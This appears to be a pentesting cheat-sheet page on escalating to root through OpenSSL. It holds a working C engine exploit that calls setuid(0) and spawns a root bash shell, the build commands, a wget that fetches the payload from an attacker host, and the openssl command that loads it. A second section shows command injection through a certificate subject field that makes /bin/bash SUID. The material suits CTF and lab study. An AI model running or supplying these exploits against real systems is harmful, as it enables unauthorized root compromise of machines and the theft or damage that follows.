---
title: OpenSSL Privilege Escalation
description:
tags:
    - Privilege Escalation
refs:
date: 2023-03-09
draft: false
---

## Privilege Escalation (SUID)

Reference: [https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/](https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/)

### 1. Get Capabilities

Chack capabilities in the target machine.

```sh
# -r: recursive
getcap -r / 2>/dev/null
```

If you see the openssl has the capability set as below, you can successfully exploit it.

```sh
/usr/bin/openssl = cap_setuid+ep
```

### 2. Create the Exploit in C

In local machine, you need to have “libssl-dev” to use the header file named “openssl/engine.h” in the exploit.  
If you don't have it yet, install it.

```sh
sudo apt install libssl-dev
```

Then create "exploit.c".

```c
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0); setgid(0);
    system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

Now compile it using gcc.

```sh
# -fPIC: for generating a shared object (PIC: Position Independent Code)
# -c: compile and assemble, but do not link.
gcc -fPIC -o exploit.o -c exploit.c
# -shared: create a shared library.
gcc -shared -o exploit.so -lcrypto exploit.o
```

### 3. Get the Root Shell

Transfer the "exploit.so" to the target machine.

```sh
wget http://<local-ip>:8000/exploit.so
```

Run the exploit and finally you should get the root shell.

```sh
# req: PKCS#10 X.509 Certificate Signing Request (CSR) Management.
# engine: Engine (loadable module) information and manipulation.
openssl req -engine ./exploit.so
```

<br />

## Command Injection in Subject

```bash
openssl x509 -in /opt/example.crt -noout -subject
```

If the above command is executed by root and use values of subjects in any way, we might be able to execute arbitrary command as root.  

### Exploitation

For example, create a certificate that contains the malicious subject value.  
When the prompt asks us to enter values, we can insert arbitrary command.

```bash
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /opt/example.key -out /opt/example.crt -days 1

...
Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /bin/bash)
...
```

Then some shell script, that uses the subject values, is executed as root, our command (**`$(chmod u+s /bin/bash)`**) may be executed as root.